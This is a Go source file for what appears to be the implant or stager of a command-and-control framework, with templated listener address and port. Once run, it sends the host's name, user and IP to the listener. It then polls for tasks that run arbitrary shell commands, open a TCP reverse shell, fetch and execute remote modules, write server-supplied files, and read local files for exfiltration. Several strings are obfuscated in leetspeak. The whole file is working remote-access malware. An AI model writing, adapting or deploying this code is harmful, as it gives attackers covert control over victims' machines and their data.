package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	STAGER            string = "{{stager.id}}"
	LISTENER_IP       string = "{{stager.listener.address}}"
	LISTENER_PORT     string = "{{stager.listener.port}}"
	SSL               string = "{{stager.listener.ssl}}"
	URL               string = "http://" + LISTENER_IP + ":" + LISTENER_PORT
	string_sleep_time string = "{{stager.options['sleep-time']}}"
	string_delay      string = "{{stager.delay}}"
) // constants defined by the stager
var (
	name           = ""
	output  string = ""
	success bool   = false
)

type Task struct {
	ID      int                    `json:"id"`
	Name    string                 `json:"name"`
	Action  string                 `json:"action"`
	Args    map[string]interface{} `json:"args"`
	Output  interface{}            `json:"output"`
	Success bool                   `json:"success"`
}

type Module struct {
	Name              string   `json:"name"`
	Admin             bool     `json:"admin"`
	Language          string   `json:"language"`
	Code_type         string   `json:"code_type"`
	Execution_methods []string `json:"execution_methods"`
}

func system_info() []byte {
	// get system info
	hostname, err := os.Hostname()

	if err != nil {
		hostname = "unknown"
	}

	user, err := user.Current()
	var username string
	if err != nil {
		username = "unknown"
	} else {
		username = user.Username
	}
	// Get the IP address of the current machine
	address := ""

	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		address = "unknown"
	} else {
		defer conn.Close()
		address = conn.LocalAddr().(*net.UDPAddr).IP.String()
	}

	data, err := json.Marshal(map[string]interface{}{
		"address":      address,
		"hostname":     hostname,
		"os":           runtime.GOOS,
		"architecture": runtime.GOARCH,
		"user":         username,
		"admin":        false,
		"stager":       STAGER,
	})

	return data

}

// Run a command and return the output and success
func run_command(command string) (output string, success bool) {
	parts := strings.Fields(command)
	executable := parts[0]
	args := parts[1:]
	cmd := exec.Command(executable, args...)
	stdout, err := cmd.Output()
	output, success = string(stdout), err == nil
	// has to return the output and success because its called by modules too
	return
}

// Execute a module using a task
func execute_module(
	task Task,
) (output string, success bool) {

	// Get the module
	resp, err := http.Get(URL + "/module/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Could not download module.", false
		return
	}

	defer resp.Body.Close()

	// Read the module
	module_body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		output, success = "Could not read module.", false
		return
	}

	// Unmarshal the module
	var module Module
	err = json.Unmarshal(module_body, &module)

	if err != nil {
		output, success = "Could not parse module.", false
		return
	}

	// Get the module code
	resp, err = http.Get(URL + "/module/download/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Could not download module code.", false
		return
	}

	defer resp.Body.Close()

	// Read the module code
	module_code, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		output, success = "Could not read module code.", false
		return
	}
	// Execute the module

	if task.Args["execution_method"] == "command" {
		output, success = run_command(string(module_code))
	} else {
		output, success = "Unsupported execution method.", false
	}
	return
}

func reverse_shell(address string, port string) {
	conn, err := net.Dial("tcp", address+":"+port)

	if err != nil {
		return
	}
	for {

		message, err := bufio.NewReader(conn).ReadString('\n')

		if err != nil {
			return
		}

		// split the message into command and arguments
		parts := strings.Fields(message)
		cmd := parts[0]
		args := parts[1:]

		// run the command
		out, err := exec.Command(cmd, args...).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}

func download_file(task_name string, path string) {
	// Get the file from the server
	resp, err := http.Get(URL + "/download/" + task_name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Could not download file.", false
		return
	}

	defer resp.Body.Close()

	// Create the file locally
	file, err := os.Create(path)

	defer file.Close()

	if err != nil {
		output, success = "Could not create file.", false
		return
	}

	// Write the file
	_, err = io.Copy(file, resp.Body)

	if err != nil {
		output, success = "Could not write to file.", false
		return
	}

	output, success = "File downloaded successfully.", true

}

func upload_file(file_name string) {
	// open the file and encode it to base64
	file, err := os.Open(file_name)

	if err != nil {
		output, success = "Could not open file.", false
		return
	}

	defer file.Close()

	fileInfo, _ := file.Stat()
	var size int64 = fileInfo.Size()
	bytes := make([]byte, size)

	buffer := bufio.NewReader(file)
	_, err = buffer.Read(bytes)

	if err != nil {
		output, success = "Could not read file.", false
		return
	}

	output, success = base64.StdEncoding.EncodeToString(bytes), true
}

func main() {
	delay, _ := strconv.Atoi(string_delay)
	sleep_time, _ := strconv.Atoi(string_sleep_time)
	time.Sleep(time.Duration(delay) * time.Second)
	// Set up the HTTP client
	client := &http.Client{}

	data := system_info()

	fmt.Println("Connecting to the L15t3n€r...")
	resp, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))

	if err != nil {
		fmt.Println("Could not connect to the l15t3n€r.")
		os.Exit(1)
	} else {
		fmt.Println("C0nn3ct3d.")
	}

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	name = result["name"].(string)

	for {
		time.Sleep(time.Duration(sleep_time) * time.Second)

		// Get the tasks
		resp, err := client.Get(URL + "/tasks/" + name)
		if err != nil {
			fmt.Println("Could not fetch tasks.")
			continue
		}

		defer resp.Body.Close()
		respBytes, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			fmt.Println("Could not read response body.")
			continue
		}

		var tasks []Task
		err = json.Unmarshal(respBytes, &tasks)

		if err != nil {
			fmt.Println("Could not unmarshal response body.")
			continue
		}

		for _, task := range tasks {
			switch task.Action {
			case "rce":
				output, success = run_command(task.Args["cmd"].(string))
			case "dir":
				run_command("ls " + task.Args["dir"].(string))
			case "reverse-shell":
				go reverse_shell(task.Args["address"].(string), task.Args["port"].(string))
				output, success = "Opened reverse shell.", true
			case "download":
				upload_file(task.Args["target_path"].(string))
			case "upload":
				download_file(task.Name, task.Args["target_path"].(string))
			case "module":
				output, success = execute_module(task)
			default:
				output, success = "Task not supported.", false
			}
			fmt.Println("Task: ", task.ID, "Output: ", output, "Success: ", success)

			data, err := json.Marshal(map[string]interface{}{
				"task":    task.ID,
				"output":  output,
				"success": success,
			})

			if err != nil {
				continue
			}

			client.Post(URL+"/finish/"+name, "application/json", bytes.NewBuffer(data))
		}
	}
}
